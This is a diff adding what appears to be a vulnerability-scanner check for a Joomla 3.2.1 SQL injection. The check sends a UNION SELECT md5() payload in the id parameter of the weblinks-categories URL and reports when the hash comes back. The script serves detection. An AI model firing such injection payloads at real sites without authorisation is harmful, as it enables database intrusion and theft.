@@ -1,0 +1,34 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************
+function alert(http, path, vxml, details) {
+	var ri = new TReportItem();
+    ri.LoadFromFile(vxml);
+    ri.affects = path;
+    ri.alertPath = "Scripts/" + vxml;    
+	if (details) ri.details = ri.details + "[break]Pattern found: [code][pre]" + details + "[/pre][/code]"    
+    ri.setHttpInfo(http);		
+    AddReportItem(ri);	    
+}
+// **************************************************************************************							 
+function testJoomlaWeblinkSQLInjection(dir, uri)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = dir.url;
+	lastJob.verb = 'GET';
+	
+	var randNum = 999+(Math.floor(Math.random()*989));
+	var	randNumMD5 = plain2md5(randNum).toLowerCase();
+	
+	var origURI = uri + "/index.php/weblinks-categories";
+	
+	lastJob.URI = uri + "/index.php/weblinks-categories?id=0+)+union+select+md5(" + randNum + ")+--+)";
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.response.body && lastJob.response.body.toLowerCase().indexOf(randNumMD5) != -1)
+	{
+		alert(lastJob, origURI, 'Joomla_v321_sql_injection.xml', randNumMD5);		
+	}
+}
+var dir = getCurrentDirectory();
+testJoomlaWeblinkSQLInjection(dir, dir.fullPath);
